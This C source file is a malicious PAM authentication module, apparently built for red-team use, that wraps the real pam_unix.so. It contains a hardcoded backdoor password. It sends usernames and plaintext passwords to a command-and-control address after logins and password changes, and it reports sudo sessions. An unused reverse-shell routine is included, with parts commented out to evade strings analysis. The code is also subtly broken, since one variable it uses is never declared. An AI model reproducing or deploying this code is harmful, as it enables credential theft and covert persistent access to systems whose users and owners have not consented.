#define _GNU_SOURCE
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <pwd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <syslog.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <ifaddrs.h>

#define PAM_PATH "/usr/lib/pam.d/pam_unix.so"
#define AUTH_PASSWORD "redteam123"

#define CALLBACK_IP "10.100.150.1"
#define CALLBACK_PORT 5000
#define RET_FMT "%s - %s %s:%s\n"

typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);

int get_local_ip(char *buffer, size_t buflen) {
    struct ifaddrs *ifaddr, *ifa;
    int family;
    
    if (getifaddrs(&ifaddr) == -1) {
        return -1;  // Failed to get interfaces
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        family = ifa->ifa_addr->sa_family;

        // Check for IPv4 (AF_INET) and ignore loopback interfaces
        if (family == AF_INET && strcmp(ifa->ifa_name, "lo") != 0) {
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            if (inet_ntop(AF_INET, &addr->sin_addr, buffer, buflen) != NULL) {
                freeifaddrs(ifaddr);
                return 0;  // Successfully found an IP
            }
        }
    }

    freeifaddrs(ifaddr);
    return -1;  // No suitable IP found
}

// Function to send data to the c2 server (mainly username:password combinations)
int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {

    if (get_local_ip(ipaddr, sizeof(ipaddr)) < 0) {
        return 1;
    }
    // char host[256];
    // char ipaddr[INET_ADDRSTRLEN + 2];
    // struct addrinfo hints, * res, * p;
    // int status; 

    // // Get the hostname
    // gethostname(host, sizeof(host));

    // if (host == NULL) {
    //     return 1;
    // }

    // // Set up the hints structure
    // memset(&hints, 0, sizeof hints);
    // hints.ai_family = AF_INET;
    // hints.ai_socktype = SOCK_STREAM;

    // // Get address information
    // status = getaddrinfo(host, NULL, &hints, &res);

    // // Loop through all the results and get the first IPv4 address
    // for (p = res; p != NULL; p = p->ai_next) {
    //     void* addr = NULL;
    //     if (p->ai_family == AF_INET) {
    //         struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
    //         addr = &(ipv4->sin_addr);

    //         // Convert the IP to a string
    //         inet_ntop(p->ai_family, addr, ipaddr, sizeof(ipaddr));
    //         int len = strnlen(ipaddr, 16);
    //         ipaddr[len + 1] = '\0';
    //         ipaddr[len] = '\n';

    //         // Break after the first IP address is found
    //         break;

    //     }
    // }

    // // Free the linked list
    // freeaddrinfo(res);

    // Get host IP address
    // char hostbuffer[256];
    // char* ipaddr;
    // struct hostent *host_entry;
    // int hostname;

    // // To retrieve hostname
    // hostname = gethostname(hostbuffer, sizeof(hostbuffer));

    // if (hostname == -1) {
    //     return 1;
    // }

    // // To retrieve host information
    // host_entry = gethostbyname(hostbuffer);

    // if (host_entry == NULL) {
    //     return 1;
    // }

    // // To convert an Internet network
    // // address into ASCII string
    // ipaddr = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));

    // Create socket to connect to c2 server
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(CALLBACK_PORT);
        inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);

        // Connect to c2 server on CALLBACK_IP and CALLBACK_PORT
        if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
            // Create credential message in RET_FMT format
            char credentials[256];
            snprintf(credentials, sizeof(credentials), RET_FMT, ipaddr, message, username, password);

            // Send message to c2 server and close connection
            send(sock, credentials, strlen(credentials), 0);
            close(sock);
         }
    }

    return 0;
}

// UNUSED: Function to spawn a reverse shell (might reimplement later)
int pam_log_err() {
    // Fork process so it won't block out other authentication
    pid_t pid = fork();
    if (pid == -1) {
		return 1;
	}
	if (pid > 0) {
		return 0;
	}

    // Create socket to c2 server
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(CALLBACK_PORT);
        inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);

        // Send /bin/bash to c2 server
        if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
            dup2(sock, 0);
            dup2(sock, 1);
            dup2(sock, 2);
            // These two lines are commented out to avoid /bin/bash showing up in strings analysis
            // char * const argv[] = {"/bin/bash", NULL};
            // execve("/bin/bash", argv, NULL);
         }
    }

    return 0;
}

// Function to dynamically link the real pam_unix.so to allow normal authentication
int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int argc, const char **argv) {
    // Error handling (these really shouldn't matter)
    if (!name) {
        return PAM_AUTH_ERR;
    }
    if (!pamh) {
        return PAM_AUTH_ERR;
    }

    // Open handle 
    void *handle = dlopen(PAM_PATH, RTLD_LAZY | RTLD_GLOBAL);
    if (!handle) {
        pam_syslog(pamh, LOG_ERR, "PAM unable to dlopen(pam_unix.so): %s", dlerror());
        return PAM_AUTH_ERR;
    }

    pam_func_t func = (pam_func_t)dlsym(handle, name);
    if (!func) {
        pam_syslog(pamh, LOG_ERR, "PAM unable to resolve symbol: %s", name);
        dlclose(handle);
        return PAM_AUTH_ERR;
    }

    int result = func(pamh, flags, argc, argv);
    //dlclose(handle);
    return result;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    const char *password;

    pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (password && strncmp(password, AUTH_PASSWORD, strlen(AUTH_PASSWORD)) == 0) {
        return PAM_SUCCESS;
    }

    // if (strncmp(password, "PAM", 8) == 0) {
    //     pam_log_err();
    //     return PAM_SUCCESS;
    // }

    int retval = pam_unix_authenticate("pam_sm_authenticate", pamh, flags, argc, argv);

    if (username && password && retval == PAM_SUCCESS) {
        pam_send_authtok(pamh, "USER AUTHENTICATED:", username, password);
    }

    return retval;
}

PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    const char *password;

    pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    int retval = pam_unix_authenticate("pam_sm_chauthtok", pamh, flags, argc, argv);

    if (username && password && retval == PAM_SUCCESS) {
        pam_send_authtok(pamh, "USER CHANGED PASSWORD:", username, password);
    }

    return retval;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_acct_mgmt", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;

    pam_get_user(pamh, &username, NULL);

    if (username) {
        // Get UID of the target user
        struct passwd *pw = getpwnam(username);
        uid_t target_uid = pw->pw_uid;

        // Get UID of the calling user
        uid_t caller_uid = getuid();
        struct passwd *caller_pw = getpwuid(caller_uid);
        const char *calling_user = caller_pw ? caller_pw->pw_name : "UNKNOWN";

        if (target_uid == 0 && caller_uid > target_uid) {
            pam_send_authtok(pamh, "SUDO SESSION OPENED:", calling_user, ":");
        }
    }

    return pam_unix_authenticate("pam_sm_open_session", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_close_session", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_setcred", pamh, flags, argc, argv);
}